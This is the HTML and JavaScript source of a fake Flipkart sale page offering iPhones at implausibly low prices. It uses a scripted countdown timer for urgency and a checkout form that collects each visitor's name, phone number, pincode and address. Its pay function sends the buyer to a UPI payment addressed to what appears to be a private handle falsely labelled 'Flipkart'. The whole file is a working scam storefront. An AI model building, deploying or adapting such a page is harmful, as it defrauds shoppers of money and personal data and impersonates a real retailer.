<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart | Sale Live Now</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #f1f3f6; font-family: Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        .fk-blue { background-color: #2874f0; }
        .color-dot { width: 34px; height: 34px; border-radius: 50%; border: 2px solid #e0e0e0; cursor: pointer; transition: 0.2s; position: relative; }
        .color-dot.active { border: 2px solid #2874f0; transform: scale(1.15); box-shadow: 0 0 8px rgba(40,116,240,0.3); }
        .color-dot.active::after { content: '✓'; position: absolute; top: -5px; right: -5px; background: #2874f0; color: white; font-size: 8px; width: 14px; height: 14px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .input-field { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; font-size: 14px; outline: none; }
        .img-container { height: 160px; display: flex; align-items: center; justify-content: center; padding: 10px; background: #fff; }
        .img-container img { max-height: 100%; max-width: 100%; object-fit: contain; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .animate-up { animation: slideUp 0.3s ease-out; }
        .timer-bg { background: #ff4343; color: white; padding: 6px; font-weight: bold; text-align: center; font-size: 13px; }
    </style>
</head>
<body class="pb-10">

    <header class="fk-blue py-3 px-4 sticky top-0 z-50 text-white flex justify-between items-center shadow-lg">
        <div class="flex flex-col">
            <span class="text-2xl font-bold italic leading-3">Flipkart</span>
            <span class="text-[10px] text-yellow-300 font-bold mt-1 uppercase">Big Billion Sale</span>
        </div>
        <div class="flex gap-4 items-center">
            <i class="fa-solid fa-magnifying-glass text-lg"></i>
            <i class="fa-solid fa-cart-shopping text-lg"></i>
        </div>
    </header>

    <div class="timer-bg sticky top-[52px] z-40 shadow-md">
        <i class="fa-solid fa-clock mr-1"></i> SALE ENDS IN: <span id="timer">09:59:59</span>
    </div>

    <main class="max-w-7xl mx-auto p-2 mt-1">
        <div id="grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2"></div>
    </main>

    <div id="pModal" class="fixed inset-0 bg-black/80 z-[100] hidden flex items-end md:items-center justify-center">
        <div class="bg-white w-full max-w-md rounded-t-3xl md:rounded-lg animate-up overflow-hidden max-h-[95vh] flex flex-col">
            <div class="p-4 border-b flex justify-between items-center bg-white sticky top-0">
                <span class="font-bold text-gray-800">Review Product</span>
                <button onclick="closeModal()" class="text-3xl text-gray-400">&times;</button>
            </div>
            
            <div class="overflow-y-auto flex-1 p-4">
                <div class="flex flex-col items-center mb-6">
                    <div class="h-64 w-full flex items-center justify-center bg-white rounded-xl border p-4 mb-4">
                        <img id="mImg" src="" class="max-h-full object-contain">
                    </div>
                    <h2 id="mName" class="font-bold text-lg text-center leading-tight"></h2>
                    <div class="flex items-center gap-2 mt-2">
                        <span id="mPrice" class="text-3xl font-black text-gray-900"></span>
                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-5">
                    </div>
                </div>

                <div class="mb-8 border-t pt-5">
                    <p class="text-[10px] font-bold text-gray-400 text-center mb-4 uppercase">Select Variant</p>
                    <div id="colorDots" class="flex gap-5 justify-center flex-wrap"></div>
                    <p id="cNameDisplay" class="text-center text-blue-600 font-bold mt-3 text-sm italic"></p>
                </div>

                <div class="border-t pt-6 space-y-4">
                    <p class="text-sm font-bold text-gray-800 uppercase flex items-center gap-2">
                        <i class="fa-solid fa-location-dot text-blue-600"></i> Delivery Details
                    </p>
                    <input type="text" id="uName" placeholder="Your Name" class="input-field">
                    <div class="grid grid-cols-2 gap-3">
                        <input type="tel" id="uPhone" placeholder="Mobile Number" class="input-field">
                        <input type="number" id="uPin" placeholder="Pincode" class="input-field">
                    </div>
                    <textarea id="uAddr" placeholder="Full Address" class="input-field h-20"></textarea>
                </div>

                <div class="mt-8 p-4 bg-gray-50 rounded-xl border mb-10">
                    <div class="flex justify-between text-sm mb-1 text-gray-500"><span>Original Price</span><span id="priceVal"></span></div>
                    <div class="flex justify-between text-sm mb-1 text-green-600 font-bold"><span>Delivery Charge</span><span>FREE</span></div>
                    <div class="flex justify-between font-black border-t pt-3 mt-2 text-xl"><span>Total Payable</span><span id="totalVal"></span></div>
                </div>
            </div>

            <div class="p-3 bg-white border-t">
                <button onclick="pay()" class="w-full bg-[#fb641b] text-white py-4 font-bold rounded shadow-lg uppercase">Proceed to Pay</button>
            </div>
        </div>
    </div>

    <script>
        const iPhoneData = [
            {
                name: "iPhone 16 Pro Max (256 GB)", price: 68999,
                variants: [
                    { c: "Desert Titanium", hex: "#beafa0", img: "https://m.media-amazon.com/images/I/81+GIkwqLIL._AC_SL1500_.jpg" },
                    { c: "Black Titanium", hex: "#3b3b3b", img: "https://m.media-amazon.com/images/I/81I6x8rQoGL._AC_SL1500_.jpg" }
                ]
            },
            {
                name: "iPhone 15 (128 GB)", price: 42500,
                variants: [
                    { c: "Pink", hex: "#f7d2d3", img: "https://m.media-amazon.com/images/I/71v2jVh6nIL._AC_SL1500_.jpg" },
                    { c: "Blue", hex: "#d0e0ed", img: "https://m.media-amazon.com/images/I/71d7rfSl0wL._AC_SL1500_.jpg" }
                ]
            }
        ];

        let activePrice = 0;

        // TIMER LOGIC
        function startTimer() {
            let h = 9, m = 59, s = 59;
            setInterval(() => {
                s--;
                if(s < 0) { s = 59; m--; }
                if(m < 0) { m = 59; h--; }
                document.getElementById('timer').innerText = 
                    `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            }, 1000);
        }

        // RENDER 200 PRODUCTS
        function render() {
            const grid = document.getElementById('grid');
            let html = '';
            for(let i=0; i<200; i++) {
                let p = iPhoneData[i % iPhoneData.length];
                html += `
                <div class="bg-white border rounded p-2 flex flex-col cursor-pointer hover:shadow-lg" onclick='openModal(${JSON.stringify(p)})'>
                    <div class="img-container">
                        <img src="${p.variants[0].img}" loading="lazy">
                    </div>
                    <div class="mt-2">
                        <h2 class="text-[11px] font-bold text-gray-700 truncate">${p.name}</h2>
                        <p class="font-black text-sm mt-1">₹${p.price.toLocaleString()}</p>
                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-1">
                    </div>
                </div>`;
            }
            grid.innerHTML = html;
        }

        function openModal(p) {
            document.getElementById('mName').innerText = p.name;
            document.getElementById('mPrice').innerText = "₹" + p.price.toLocaleString();
            document.getElementById('priceVal').innerText = "₹" + p.price.toLocaleString();
            document.getElementById('totalVal').innerText = "₹" + p.price.toLocaleString();
            document.getElementById('mImg').src = p.variants[0].img;
            document.getElementById('cNameDisplay').innerText = p.variants[0].c;
            activePrice = p.price;

            const dotBox = document.getElementById('colorDots');
            dotBox.innerHTML = p.variants.map((v, idx) => `
                <div class="color-dot ${idx===0?'active':''}" 
                     style="background:${v.hex}" 
                     onclick="event.stopPropagation(); changeVariant('${v.img}', '${v.c}', this)">
                </div>
            `).join('');

            document.getElementById('pModal').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        function changeVariant(imgSrc, colorName, element) {
            document.getElementById('mImg').src = imgSrc;
            document.getElementById('cNameDisplay').innerText = colorName;
            document.querySelectorAll('.color-dot').forEach(dot => dot.classList.remove('active'));
            element.classList.add('active');
        }

        function closeModal() {
            document.getElementById('pModal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function pay() {
            if(!document.getElementById('uName').value || !document.getElementById('uPhone').value) return alert("Pehle Address bhariye!");
            window.location.href = `upi://pay?pa=8709615634-w350@ybl&pn=Flipkart&am=${activePrice}&cu=INR`;
        }

        render();
        startTimer();
    </script>
</body>
</html>>
